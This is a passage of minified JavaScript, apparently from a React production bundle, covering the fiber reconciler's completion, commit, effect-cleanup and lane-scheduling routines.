h=="number"&&hu(e,""+h):l!=="suppressContentEditableWarning"&&l!=="suppressHydrationWarning"&&l!=="autoFocus"&&(fu.hasOwnProperty(l)?h!=null&&l==="onScroll"&&Rt("scroll",e):h!=null&&G0(e,l,h,u))}switch(n){case"input":qc(e),Oy(e,r,!1);break;case"textarea":qc(e),My(e);break;case"option":r.value!=null&&e.setAttribute("value",""+Na(r.value));break;case"select":e.multiple=!!r.multiple,l=r.value,l!=null?ul(e,!!r.multiple,l,!1):r.defaultValue!=null&&ul(e,!!r.multiple,r.defaultValue,!0);break;default:typeof a.onClick=="function"&&(e.onclick=Wd)}switch(n){case"button":case"input":case"select":case"textarea":r=!!r.autoFocus;break e;case"img":r=!0;break e;default:r=!1}}r&&(t.flags|=4)}t.ref!==null&&(t.flags|=512,t.flags|=2097152)}return jn(t),null;case 6:if(e&&t.stateNode!=null)ww(e,t,e.memoizedProps,r);else{if(typeof r!="string"&&t.stateNode===null)throw Error(Se(166));if(n=rs(Tu.current),rs(di.current),Jc(t)){if(r=t.stateNode,n=t.memoizedProps,r[ui]=t,(l=r.nodeValue!==n)&&(e=yr,e!==null))switch(e.tag){case 3:Zc(r.nodeValue,n,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&Zc(r.nodeValue,n,(e.mode&1)!==0)}l&&(t.flags|=4)}else r=(n.nodeType===9?n:n.ownerDocument).createTextNode(r),r[ui]=t,t.stateNode=r}return jn(t),null;case 13:if(Ft($t),r=t.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(zt&&xr!==null&&t.mode&1&&!(t.flags&128))HE(),wl(),t.flags|=98560,l=!1;else if(l=Jc(t),r!==null&&r.dehydrated!==null){if(e===null){if(!l)throw Error(Se(318));if(l=t.memoizedState,l=l!==null?l.dehydrated:null,!l)throw Error(Se(317));l[ui]=t}else wl(),!(t.flags&128)&&(t.memoizedState=null),t.flags|=4;jn(t),l=!1}else Yr!==null&&(f0(Yr),Yr=null),l=!0;if(!l)return t.flags&65536?t:null}return t.flags&128?(t.lanes=n,t):(r=r!==null,r!==(e!==null&&e.memoizedState!==null)&&r&&(t.child.flags|=8192,t.mode&1&&(e===null||$t.current&1?mn===0&&(mn=3):Lg())),t.updateQueue!==null&&(t.flags|=4),jn(t),null);case 4:return Tl(),i0(e,t),e===null&&bu(t.stateNode.containerInfo),jn(t),null;case 10:return hg(t.type._context),jn(t),null;case 17:return or(t.type)&&qd(),jn(t),null;case 19:if(Ft($t),l=t.memoizedState,l===null)return jn(t),null;if(r=(t.flags&128)!==0,u=l.rendering,u===null)if(r)Lo(l,!1);else{if(mn!==0||e!==null&&e.flags&128)for(e=t.child;e!==null;){if(u=Xd(e),u!==null){for(t.flags|=128,Lo(l,!1),r=u.updateQueue,r!==null&&(t.updateQueue=r,t.flags|=4),t.subtreeFlags=0,r=n,n=t.child;n!==null;)l=n,e=r,l.flags&=14680066,u=l.alternate,u===null?(l.childLanes=0,l.lanes=e,l.child=null,l.subtreeFlags=0,l.memoizedProps=null,l.memoizedState=null,l.updateQueue=null,l.dependencies=null,l.stateNode=null):(l.childLanes=u.childLanes,l.lanes=u.lanes,l.child=u.child,l.subtreeFlags=0,l.deletions=null,l.memoizedProps=u.memoizedProps,l.memoizedState=u.memoizedState,l.updateQueue=u.updateQueue,l.type=u.type,e=u.dependencies,l.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),n=n.sibling;return It($t,$t.current&1|2),t.child}e=e.sibling}l.tail!==null&&en()>Sl&&(t.flags|=128,r=!0,Lo(l,!1),t.lanes=4194304)}else{if(!r)if(e=Xd(u),e!==null){if(t.flags|=128,r=!0,n=e.updateQueue,n!==null&&(t.updateQueue=n,t.flags|=4),Lo(l,!0),l.tail===null&&l.tailMode==="hidden"&&!u.alternate&&!zt)return jn(t),null}else 2*en()-l.renderingStartTime>Sl&&n!==1073741824&&(t.flags|=128,r=!0,Lo(l,!1),t.lanes=4194304);l.isBackwards?(u.sibling=t.child,t.child=u):(n=l.last,n!==null?n.sibling=u:t.child=u,l.last=u)}return l.tail!==null?(t=l.tail,l.rendering=t,l.tail=t.sibling,l.renderingStartTime=en(),t.sibling=null,n=$t.current,It($t,r?n&1|2:n&1),t):(jn(t),null);case 22:case 23:return Dg(),r=t.memoizedState!==null,e!==null&&e.memoizedState!==null!==r&&(t.flags|=8192),r&&t.mode&1?gr&1073741824&&(jn(t),t.subtreeFlags&6&&(t.flags|=8192)):jn(t),null;case 24:return null;case 25:return null}throw Error(Se(156,t.tag))}function nD(e,t){switch(ug(t),t.tag){case 1:return or(t.type)&&qd(),e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 3:return Tl(),Ft(lr),Ft(Fn),yg(),e=t.flags,e&65536&&!(e&128)?(t.flags=e&-65537|128,t):null;case 5:return xg(t),null;case 13:if(Ft($t),e=t.memoizedState,e!==null&&e.dehydrated!==null){if(t.alternate===null)throw Error(Se(340));wl()}return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 19:return Ft($t),null;case 4:return Tl(),null;case 10:return hg(t.type._context),null;case 22:case 23:return Dg(),null;case 24:return null;default:return null}}var nd=!1,Rn=!1,rD=typeof WeakSet=="function"?WeakSet:Set,ze=null;function sl(e,t){var n=e.ref;if(n!==null)if(typeof n=="function")try{n(null)}catch(r){Kt(e,t,r)}else n.current=null}function a0(e,t,n){try{n()}catch(r){Kt(e,t,r)}}var Nv=!1;function iD(e,t){if(zm=Hd,e=NE(),lg(e)){if("selectionStart"in e)var n={start:e.selectionStart,end:e.selectionEnd};else e:{n=(n=e.ownerDocument)&&n.defaultView||window;var r=n.getSelection&&n.getSelection();if(r&&r.rangeCount!==0){n=r.anchorNode;var a=r.anchorOffset,l=r.focusNode;r=r.focusOffset;try{n.nodeType,l.nodeType}catch{n=null;break e}var u=0,f=-1,h=-1,m=0,x=0,g=e,b=null;t:for(;;){for(var E;g!==n||a!==0&&g.nodeType!==3||(f=u+a),g!==l||r!==0&&g.nodeType!==3||(h=u+r),g.nodeType===3&&(u+=g.nodeValue.length),(E=g.firstChild)!==null;)b=g,g=E;for(;;){if(g===e)break t;if(b===n&&++m===a&&(f=u),b===l&&++x===r&&(h=u),(E=g.nextSibling)!==null)break;g=b,b=g.parentNode}g=E}n=f===-1||h===-1?null:{start:f,end:h}}else n=null}n=n||{start:0,end:0}}else n=null;for(Wm={focusedElem:e,selectionRange:n},Hd=!1,ze=t;ze!==null;)if(t=ze,e=t.child,(t.subtreeFlags&1028)!==0&&e!==null)e.return=t,ze=e;else for(;ze!==null;){t=ze;try{var C=t.alternate;if(t.flags&1024)switch(t.tag){case 0:case 11:case 15:break;case 1:if(C!==null){var P=C.memoizedProps,O=C.memoizedState,N=t.stateNode,T=N.getSnapshotBeforeUpdate(t.elementType===t.type?P:qr(t.type,P),O);N.__reactInternalSnapshotBeforeUpdate=T}break;case 3:var A=t.stateNode.containerInfo;A.nodeType===1?A.textContent="":A.nodeType===9&&A.documentElement&&A.removeChild(A.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(Se(163))}}catch(_){Kt(t,t.return,_)}if(e=t.sibling,e!==null){e.return=t.return,ze=e;break}ze=t.return}return C=Nv,Nv=!1,C}function eu(e,t,n){var r=t.updateQueue;if(r=r!==null?r.lastEffect:null,r!==null){var a=r=r.next;do{if((a.tag&e)===e){var l=a.destroy;a.destroy=void 0,l!==void 0&&a0(t,n,l)}a=a.next}while(a!==r)}}function Lf(e,t){if(t=t.updateQueue,t=t!==null?t.lastEffect:null,t!==null){var n=t=t.next;do{if((n.tag&e)===e){var r=n.create;n.destroy=r()}n=n.next}while(n!==t)}}function s0(e){var t=e.ref;if(t!==null){var n=e.stateNode;switch(e.tag){case 5:e=n;break;default:e=n}typeof t=="function"?t(e):t.current=e}}function kw(e){var t=e.alternate;t!==null&&(e.alternate=null,kw(t)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(t=e.stateNode,t!==null&&(delete t[ui],delete t[wu],delete t[Ym],delete t[H3],delete t[U3])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function Tw(e){return e.tag===5||e.tag===3||e.tag===4}function Av(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||Tw(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function l0(e,t,n){var r=e.tag;if(r===5||r===6)e=e.stateNode,t?n.nodeType===8?n.parentNode.insertBefore(e,t):n.insertBefore(e,t):(n.nodeType===8?(t=n.parentNode,t.insertBefore(e,n)):(t=n,t.appendChild(e)),n=n._reactRootContainer,n!=null||t.onclick!==null||(t.onclick=Wd));else if(r!==4&&(e=e.child,e!==null))for(l0(e,t,n),e=e.sibling;e!==null;)l0(e,t,n),e=e.sibling}function o0(e,t,n){var r=e.tag;if(r===5||r===6)e=e.stateNode,t?n.insertBefore(e,t):n.appendChild(e);else if(r!==4&&(e=e.child,e!==null))for(o0(e,t,n),e=e.sibling;e!==null;)o0(e,t,n),e=e.sibling}var Nn=null,$r=!1;function ea(e,t,n){for(n=n.child;n!==null;)Cw(e,t,n),n=n.sibling}function Cw(e,t,n){if(ci&&typeof ci.onCommitFiberUnmount=="function")try{ci.onCommitFiberUnmount(wf,n)}catch{}switch(n.tag){case 5:Rn||sl(n,t);case 6:var r=Nn,a=$r;Nn=null,ea(e,t,n),Nn=r,$r=a,Nn!==null&&($r?(e=Nn,n=n.stateNode,e.nodeType===8?e.parentNode.removeChild(n):e.removeChild(n)):Nn.removeChild(n.stateNode));break;case 18:Nn!==null&&($r?(e=Nn,n=n.stateNode,e.nodeType===8?Hp(e.parentNode,n):e.nodeType===1&&Hp(e,n),xu(e)):Hp(Nn,n.stateNode));break;case 4:r=Nn,a=$r,Nn=n.stateNode.containerInfo,$r=!0,ea(e,t,n),Nn=r,$r=a;break;case 0:case 11:case 14:case 15:if(!Rn&&(r=n.updateQueue,r!==null&&(r=r.lastEffect,r!==null))){a=r=r.next;do{var l=a,u=l.destroy;l=l.tag,u!==void 0&&(l&2||l&4)&&a0(n,t,u),a=a.next}while(a!==r)}ea(e,t,n);break;case 1:if(!Rn&&(sl(n,t),r=n.stateNode,typeof r.componentWillUnmount=="function"))try{r.props=n.memoizedProps,r.state=n.memoizedState,r.componentWillUnmount()}catch(f){Kt(n,t,f)}ea(e,t,n);break;case 21:ea(e,t,n);break;case 22:n.mode&1?(Rn=(r=Rn)||n.memoizedState!==null,ea(e,t,n),Rn=r):ea(e,t,n);break;default:ea(e,t,n)}}function Dv(e){var t=e.updateQueue;if(t!==null){e.updateQueue=null;var n=e.stateNode;n===null&&(n=e.stateNode=new rD),t.forEach(function(r){var a=hD.bind(null,e,r);n.has(r)||(n.add(r),r.then(a,a))})}}function Wr(e,t){var n=t.deletions;if(n!==null)for(var r=0;r<n.length;r++){var a=n[r];try{var l=e,u=t,f=u;e:for(;f!==null;){switch(f.tag){case 5:Nn=f.stateNode,$r=!1;break e;case 3:Nn=f.stateNode.containerInfo,$r=!0;break e;case 4:Nn=f.stateNode.containerInfo,$r=!0;break e}f=f.return}if(Nn===null)throw Error(Se(160));Cw(l,u,a),Nn=null,$r=!1;var h=a.alternate;h!==null&&(h.return=null),a.return=null}catch(m){Kt(a,t,m)}}if(t.subtreeFlags&12854)for(t=t.child;t!==null;)Sw(t,e),t=t.sibling}function Sw(e,t){var n=e.alternate,r=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(Wr(t,e),ai(e),r&4){try{eu(3,e,e.return),Lf(3,e)}catch(P){Kt(e,e.return,P)}try{eu(5,e,e.return)}catch(P){Kt(e,e.return,P)}}break;case 1:Wr(t,e),ai(e),r&512&&n!==null&&sl(n,n.return);break;case 5:if(Wr(t,e),ai(e),r&512&&n!==null&&sl(n,n.return),e.flags&32){var a=e.stateNode;try{hu(a,"")}catch(P){Kt(e,e.return,P)}}if(r&4&&(a=e.stateNode,a!=null)){var l=e.memoizedProps,u=n!==null?n.memoizedProps:l,f=e.type,h=e.updateQueue;if(e.updateQueue=null,h!==null)try{f==="input"&&l.type==="radio"&&l.name!=null&&G2(a,l),Im(f,u);var m=Im(f,l);for(u=0;u<h.length;u+=2){var x=h[u],g=h[u+1];x==="style"?J2(a,g):x==="dangerouslySetInnerHTML"?X2(a,g):x==="children"?hu(a,g):G0(a,x,g,m)}switch(f){case"input":Nm(a,l);break;case"textarea":Q2(a,l);break;case"select":var b=a._wrapperState.wasMultiple;a._wrapperState.wasMultiple=!!l.multiple;var E=l.value;E!=null?ul(a,!!l.multiple,E,!1):b!==!!l.multiple&&(l.defaultValue!=null?ul(a,!!l.multiple,l.defaultValue,!0):ul(a,!!l.multiple,l.multiple?[]:"",!1))}a[wu]=l}catch(P){Kt(e,e.return,P)}}break;case 6:if(Wr(t,e),ai(e),r&4){if(e.stateNode===null)throw Error(Se(162));a=e.stateNode,l=e.memoizedProps;try{a.nodeValue=l}catch(P){Kt(e,e.return,P)}}break;case 3:if(Wr(t,e),ai(e),r&4&&n!==null&&n.memoizedState.isDehydrated)try{xu(t.containerInfo)}catch(P){Kt(e,e.return,P)}break;case 4:Wr(t,e),ai(e);break;case 13:Wr(t,e),ai(e),a=e.child,a.flags&8192&&(l=a.memoizedState!==null,a.stateNode.isHidden=l,!l||a.alternate!==null&&a.alternate.memoizedState!==null||(Ng=en())),r&4&&Dv(e);break;case 22:if(x=n!==null&&n.memoizedState!==null,e.mode&1?(Rn=(m=Rn)||x,Wr(t,e),Rn=m):Wr(t,e),ai(e),r&8192){if(m=e.memoizedState!==null,(e.stateNode.isHidden=m)&&!x&&e.mode&1)for(ze=e,x=e.child;x!==null;){for(g=ze=x;ze!==null;){switch(b=ze,E=b.child,b.tag){case 0:case 11:case 14:case 15:eu(4,b,b.return);break;case 1:sl(b,b.return);var C=b.stateNode;if(typeof C.componentWillUnmount=="function"){r=b,n=b.return;try{t=r,C.props=t.memoizedProps,C.state=t.memoizedState,C.componentWillUnmount()}catch(P){Kt(r,n,P)}}break;case 5:sl(b,b.return);break;case 22:if(b.memoizedState!==null){_v(g);continue}}E!==null?(E.return=b,ze=E):_v(g)}x=x.sibling}e:for(x=null,g=e;;){if(g.tag===5){if(x===null){x=g;try{a=g.stateNode,m?(l=a.style,typeof l.setProperty=="function"?l.setProperty("display","none","important"):l.display="none"):(f=g.stateNode,h=g.memoizedProps.style,u=h!=null&&h.hasOwnProperty("display")?h.display:null,f.style.display=Z2("display",u))}catch(P){Kt(e,e.return,P)}}}else if(g.tag===6){if(x===null)try{g.stateNode.nodeValue=m?"":g.memoizedProps}catch(P){Kt(e,e.return,P)}}else if((g.tag!==22&&g.tag!==23||g.memoizedState===null||g===e)&&g.child!==null){g.child.return=g,g=g.child;continue}if(g===e)break e;for(;g.sibling===null;){if(g.return===null||g.return===e)break e;x===g&&(x=null),g=g.return}x===g&&(x=null),g.sibling.return=g.return,g=g.sibling}}break;case 19:Wr(t,e),ai(e),r&4&&Dv(e);break;case 21:break;default:Wr(t,e),ai(e)}}function ai(e){var t=e.flags;if(t&2){try{e:{for(var n=e.return;n!==null;){if(Tw(n)){var r=n;break e}n=n.return}throw Error(Se(160))}switch(r.tag){case 5:var a=r.stateNode;r.flags&32&&(hu(a,""),r.flags&=-33);var l=Av(e);o0(e,l,a);break;case 3:case 4:var u=r.stateNode.containerInfo,f=Av(e);l0(e,f,u);break;default:throw Error(Se(161))}}catch(h){Kt(e,e.return,h)}e.flags&=-3}t&4096&&(e.flags&=-4097)}function aD(e,t,n){ze=e,Nw(e)}function Nw(e,t,n){for(var r=(e.mode&1)!==0;ze!==null;){var a=ze,l=a.child;if(a.tag===22&&r){var u=a.memoizedState!==null||nd;if(!u){var f=a.alternate,h=f!==null&&f.memoizedState!==null||Rn;f=nd;var m=Rn;if(nd=u,(Rn=h)&&!m)for(ze=a;ze!==null;)u=ze,h=u.child,u.tag===22&&u.memoizedState!==null?Iv(a):h!==null?(h.return=u,ze=h):Iv(a);for(;l!==null;)ze=l,Nw(l),l=l.sibling;ze=a,nd=f,Rn=m}Lv(e)}else a.subtreeFlags&8772&&l!==null?(l.return=a,ze=l):Lv(e)}}function Lv(e){for(;ze!==null;){var t=ze;if(t.flags&8772){var n=t.alternate;try{if(t.flags&8772)switch(t.tag){case 0:case 11:case 15:Rn||Lf(5,t);break;case 1:var r=t.stateNode;if(t.flags&4&&!Rn)if(n===null)r.componentDidMount();else{var a=t.elementType===t.type?n.memoizedProps:qr(t.type,n.memoizedProps);r.componentDidUpdate(a,n.memoizedState,r.__reactInternalSnapshotBeforeUpdate)}var l=t.updateQueue;l!==null&&pv(t,l,r);break;case 3:var u=t.updateQueue;if(u!==null){if(n=null,t.child!==null)switch(t.child.tag){case 5:n=t.child.stateNode;break;case 1:n=t.child.stateNode}pv(t,u,n)}break;case 5:var f=t.stateNode;if(n===null&&t.flags&4){n=f;var h=t.memoizedProps;switch(t.type){case"button":case"input":case"select":case"textarea":h.autoFocus&&n.focus();break;case"img":h.src&&(n.src=h.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(t.memoizedState===null){var m=t.alternate;if(m!==null){var x=m.memoizedState;if(x!==null){var g=x.dehydrated;g!==null&&xu(g)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(Se(163))}Rn||t.flags&512&&s0(t)}catch(b){Kt(t,t.return,b)}}if(t===e){ze=null;break}if(n=t.sibling,n!==null){n.return=t.return,ze=n;break}ze=t.return}}function _v(e){for(;ze!==null;){var t=ze;if(t===e){ze=null;break}var n=t.sibling;if(n!==null){n.return=t.return,ze=n;break}ze=t.return}}function Iv(e){for(;ze!==null;){var t=ze;try{switch(t.tag){case 0:case 11:case 15:var n=t.return;try{Lf(4,t)}catch(h){Kt(t,n,h)}break;case 1:var r=t.stateNode;if(typeof r.componentDidMount=="function"){var a=t.return;try{r.componentDidMount()}catch(h){Kt(t,a,h)}}var l=t.return;try{s0(t)}catch(h){Kt(t,l,h)}break;case 5:var u=t.return;try{s0(t)}catch(h){Kt(t,u,h)}}}catch(h){Kt(t,t.return,h)}if(t===e){ze=null;break}var f=t.sibling;if(f!==null){f.return=t.return,ze=f;break}ze=t.return}}var sD=Math.ceil,ef=Hi.ReactCurrentDispatcher,Cg=Hi.ReactCurrentOwner,_r=Hi.ReactCurrentBatchConfig,mt=0,wn=null,on=null,An=0,gr=0,ll=_a(0),mn=0,Au=null,fs=0,_f=0,Sg=0,tu=null,ar=null,Ng=0,Sl=1/0,Ti=null,tf=!1,u0=null,Ta=null,rd=!1,ma=null,nf=0,nu=0,c0=null,Td=-1,Cd=0;function Zn(){return mt&6?en():Td!==-1?Td:Td=en()}function Ca(e){return e.mode&1?mt&2&&An!==0?An&-An:W3.transition!==null?(Cd===0&&(Cd=dE()),Cd):(e=St,e!==0||(e=window.event,e=e===void 0?16:yE(e.type)),e):1}function Gr(e,t,n,r){if(50<nu)throw nu=0,c0=null,Error(Se(185));zu(e,n,r),(!(mt&2)||e!==wn)&&(e===wn&&(!(mt&2)&&(_f|=n),mn===4&&ha(e,An)),ur(e,r),n===1&&mt===0&&!(t.mode&1)&&(Sl=en()+500,Nf&&Ia()))}function ur(e,t){var n=e.callbackNode;WA(e,t);var r=Bd(e,e===wn?An:0);if(r===0)n!==null&&Uy(n),e.callbackNode=null,e.callbackPriority=0;else if(t=r&-r,e.callbackPriority!==t){if(n!=null&&Uy(n),t===1)e.tag===0?z3(Pv.bind(null,e)):FE(Pv.bind(null,e)),M3(function(){!(mt&6)&&Ia()}),n=null;else{switch(fE(r)){case 1:n=J0;break;case 4:n=uE;break;case 16:n=Md;break;case 536870912:n=cE;break;default:n=Md}n=Rw(n,Aw.bind(null,e))}e.callbackPriority=t,e.callbackNode=n}}function Aw(e,t){if(Td=-1,Cd=0,mt&6)throw Error(Se(327));var n=e.callbackNode;if(pl()&&e.callbackNode!==n)return null;var r=Bd(e,e===wn?An:0);if(r===0)return null;if(r&30||r&e.expiredLanes||t)t=rf(e,r);else{t=r;var a=mt;mt|=2;var l=Lw();(wn!==e||An!==t)&&(Ti=null,Sl=en()+500,as(e,t));do try{uD();break}catch(f){Dw(e,f)}while(!0);fg(),ef.current=l,mt=a,on!==null?t=0:(wn=null,An=0,t=mn)}if(t!==0){if(t===2&&(a=Fm(e),a!==0&&(r=a,t=d0(e,a))),t===1)throw n=Au,as(e,0),ha(e,r),ur(e,en()),n;if(t===6)ha(e,r);else{if(a=e.current.alternate,!(r&30)&&!lD(a)&&(t=rf(e,r),t===2&&(l=Fm(e),l!==0&&(r=l,t=d0(e,l))),t===1))throw n=Au,as(e,0),ha(e,r),ur(e,en()),n;switch(e.finishedWork=a,e.finishedLanes=r,t){case 0:case 1:throw Error(Se(345));case 2:Za(e,ar,Ti);break;case 3:if(ha(e,r),(r&130023424)===r&&(t=Ng+500-en(),10<t)){if(Bd(e,0)!==0)break;if(a=e.suspendedLanes,(a&r)!==r){Zn(),e.pingedLanes|=e.suspendedLanes&a;break}e.timeoutHandle=$m(Za.bind(null,e,ar,Ti),t);break}Za(e,ar,Ti);break;case 4:if(ha(e,r),(r&4194240)===r)break;for(t=e.eventTimes,a=-1;0<r;){var u=31-Vr(r);l=1<<u,u=t[u],u>a&&(a=u),r&=~l}if(r=a,r=en()-r,r=(120>r?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*sD(r/1960))-r,10<r){e.timeoutHandle=$m(Za.bind(null,e,ar,Ti),r);break}Za(e,ar,Ti);break;case 5:Za(e,ar,Ti);break;default:throw Error(Se(329))}}}return ur(e,en()),e.callbackNode===n?Aw.bind(null,e):null}function d0(e,t){var n=tu;return e.current.memoizedState.isDehydrated&&(as(e,t).flags|=256),e=rf(e,t),e!==2&&(t=ar,ar=n,t!==null&&f0(t)),e}function f0(e){ar===null?ar=e:ar.push.apply(ar,e)}function lD(e){for(var t=e;;){if(t.flags&16384){var n=t.updateQueue;if(n!==null&&(n=n.stores,n!==null))for(var r=0;r<n.length;r++){var a=n[r],l=a.getSnapshot;a=a.value;try{if(!Kr(l(),a))return!1}catch{return!1}}}if(n=t.child,t.subtreeFlags&16384&&n!==null)n.return=t,t=n;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function ha(e,t){for(t&=~Sg,t&=~_f,e.suspendedLanes|=t,e.pingedLanes&=~t,e=e.expirationTimes;0<t;){var n=31-Vr(t),r=1<<n;e[n]=-1,t&=~r}}function Pv(e){if(mt&6)throw Error(Se(327));pl();var t=Bd(e,0);if(!(t&1))return ur(e,en()),null;var n=rf(e,t);if(e.tag!==0&&n===2){var r=Fm(e);r!==0&&(t=r,n=d0(e,r))}if(n===1)throw n=Au,as(e,0),ha(e,t),ur(e,en()),n;if(n===6)throw Error(Se(345));return e.finishedWork=e.current.alternate,e.finishedLanes=t,Za(e,ar,Ti),ur(e,en()),null}function Ag(e,t){var n=mt;mt|=1;try{return e(t)}finally{mt=n,mt===0&&(Sl=en()+500,Nf&&Ia())}}function hs(e){ma!==null&&ma.tag===0&&!(mt&6)&&pl();var t=mt;mt|=1;var n=_r.transition,r=St;try{if(_r.transition=null,St=1,e)return e()}finally{St=r,_r.transition=n,mt=t,!(mt&6)&&Ia()}}function Dg(){gr=ll.current,Ft(ll)}function as(e,t){e.finishedWork=null,e.finishedLanes=0;var n=e.timeoutHandle;if(n!==-1&&(e.timeoutHandle=-1,F3(n)),on!==null)for(n=on.return;n!==null;){var r=n;switch(ug(r),r.tag){case 1:r=r.type.childContextTypes,r!=null&&qd();break;case 3:Tl(),Ft(lr),Ft(Fn),yg();break;case 5:xg(r);break;case 4:Tl();break;case 13:Ft($t);break;case 19:Ft($t);break;case 10:hg(r.type._context);break;case 22:case 23:Dg()}n=n.return}if(wn=e,on=e=Sa(e.current,null),An=gr=t,mn=0,Au=null,Sg=_f=fs=0,ar=tu=null,ns!==null){for(t=0;t<ns.length;t++)if(n=ns[t],r=n.interleaved,r!==null){n.interleaved=null;var a=r.next,l=n.pending;if(l!==null){var u=l.next;l.next=a,r.next=u}n.pending=r}ns=null}return e}function Dw(e,t){do{var n=on;try{if(fg(),Ed.current=Jd,Zd){for(var r=Yt.memoizedState;r!==null;){var a=r.queue;a!==null&&(a.pending=null),r=r.next}Zd=!1}if(ds=0,bn=pn=Yt=null,Jo=!1,Cu=0,Cg.current=null,n===null||n.return===null){mn=1,Au=t,on=null;break}e:{var l=e,u=n.return,f=n,h=t;if(t=An,f.flags|=32768,h!==null&&typeof h=="object"&&typeof h.then=="function"){var m=h,x=f,g=x.tag;if(!(x.mode&1)&&(g===0||g===11||g===15)){var b=x.alternate;b?(x.updateQueue=b.updateQueue,x.memoizedState=b.memoizedState,x.lanes=b.lanes):(x.updateQueue=null,x.memoizedState=null)}var E=bv(u);if(E!==null){E.flags&=-257,Ev(E,u,f,l,t),E.mode&1&&vv(l,m,t),t=E,h=m;var C=t.updateQueue;if(C===null){var P=new Set;P.add(h),t.updateQueue=P}else C.add(h);break e}else{if(!(t&1)){vv(l,m,t),Lg();break e}h=Error(Se(426))}}else if(zt&&f.mode&1){var O=bv(u);if(O!==null){!(O.flags&65536)&&(O.flags|=256),Ev(O,u,f,l,t),cg(Cl(h,f));break e}}l=h=Cl(h,f),mn!==4&&(mn=2),tu===null?tu=[l]:tu.push(l),l=u;do{switch(l.tag){case 3:l.flags|=65536,t&=-t,l.lanes|=t;var N=fw(l,h,t);hv(l,N);break e;case 1:f=h;var T=l.type,A=l.stateNode;if(!(l.flags&128)&&(typeof T.getDerivedStateFromError=="function"||A!==null&&typeof A.componentDidCatch=="function"&&(Ta===null||!Ta.has(A)))){l.flags|=65536,t&=-t,l.lanes|=t;var _=hw(l,f,t);hv(l,_);break e}}l=l.return}while(l!==null)}Iw(n)}catch(M){t=M,on===n&&n!==null&&(on=n=n.return);continue}break}while(!0)}function Lw(){var e=ef.current;return ef.current=Jd,e===null?Jd:e}function Lg(){(mn===0||mn===3||mn===2)&&(mn=4),wn===null||!(fs&268435455)&&!(_f&268435455)||ha(wn,An)}function rf(e,t){var n=mt;mt|=2;var r=Lw();(wn!==e||An!==t)&&(Ti=null,as(e,t));do try{oD();break}catch(a){Dw(e,a)}while(!0);if(fg(),mt=n,ef.current=r,on!==null)throw Error(Se(261));return wn=null,An=0,mn}function oD(){for(;on!==null;)_w(on)}function uD(){for(;on!==null&&!jA();)_w(on)}function _w(e){var t=jw(e.alternate,e,gr);e.memoizedProps=e.pendingProps,t===null?Iw(e):on=t,Cg.current=null}function Iw(e){var t=e;do{var n=t.alternate;if(e=t.return,t.flags&32768){if(n=nD(n,t),n!==null){n.flags&=32767,on=n;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{mn=6,on=null;return}}else if(n=tD(n,t,gr),n!==null){on=n;return}if(t=t.sibling,t!==null){on=t;return}on=t=e}while(t!==null);mn===0&&(mn=5)}function Za(e,t,n){var r=St,a=_r.transition;try{_r.transition=null,St=1,cD(e,t,n,r)}finally{_r.transition=a,St=r}return null}function cD(e,t,n,r){do pl();while(ma!==null);if(mt&6)throw Error(Se(327));n=e.finishedWork;var a=e.finishedLanes;if(n===null)return null;if(e.finishedWork=null,e.finishedLanes=0,n===e.current)throw Error(Se(177));e.callbackNode=null,e.callbackPriority=0;var l=n.lanes|n.childLanes;if(qA(e,l),e===wn&&(on=wn=null,An=0),!(n.subtreeFlags&2064)&&!(n.flags&2064)||rd||(rd=!0,Rw(Md,function(){return pl(),null})),l=(n.flags&15990)!==0,n.subtreeFlags&15990||l){l=_r.transition,_r.transition=null;var u=St;St=1;var f=mt;mt|=4,Cg.current=null,iD(e,n),Sw(n,e),L3(Wm),Hd=!!zm,Wm=zm=null,e.current=n,aD(n),RA(),mt=f,St=u,_r.transition=l}else e.current=n;if(rd&&(rd=!1,ma=e,nf=a),l=e.pendingLanes,l===0&&(Ta=null),MA(n.stateNode),ur(e,en()),t!==null)for(r=e.onRecoverableError,n=0;n<t.length;n++)a=t[n],r(a.value,{componentStack:a.stack,digest:a.digest});if(tf)throw tf=!1,e=u0,u0=null,e;return nf&1&&e.tag!==0&&pl(),l=e.pendingLanes,l&1?e===c0?nu++:(nu=0,c0=e):nu=0,Ia(),null}function pl(){if(ma!==null){var e=fE(nf),t=_r.transition,n=St;try{if(_r.transition=null,St=16>e?16:e,ma===null)var r=!1;else{if(e=ma,ma=null,nf=0,mt&6)throw Error(Se(331));var a=mt;for(mt|=4,ze=e.current;ze!==null;){var l=ze,u=l.child;if(ze.flags&16){var f=l.deletions;if(f!==null){for(var h=0;h<f.length;h++){var m=f[h];for(ze=m;ze!==null;){var x=ze;switch(x.tag){case 0:case 11:case 15:eu(8,x,l)}var g=x.child;if(g!==null)g.return=x,ze=g;else for(;ze!==null;){x=ze;var b=x.sibling,E=x.return;if(kw(x),x===m){ze=null;break}if(b!==null){b.return=E,ze=b;break}ze=E}}}var C=l.alternate;if(C!==null){var P=C.child;if(P!==null){C.child=null;do{var O=P.sibling;P.sibling=null,P=O}while(P!==null)}}ze=l}}if(l.subtreeFlags&2064&&u!==null)u.return=l,ze=u;else e:for(;ze!==null;){if(l=ze,l.flags&2048)switch(l.tag){case 0:case 11:case 15:eu(9,l,l.return)}var N=l.sibling;if(N!==null){N.return=l.return,ze=N;break e}ze=l.return}}var T=e.current;for(ze=T;ze!==null;){u=ze;var 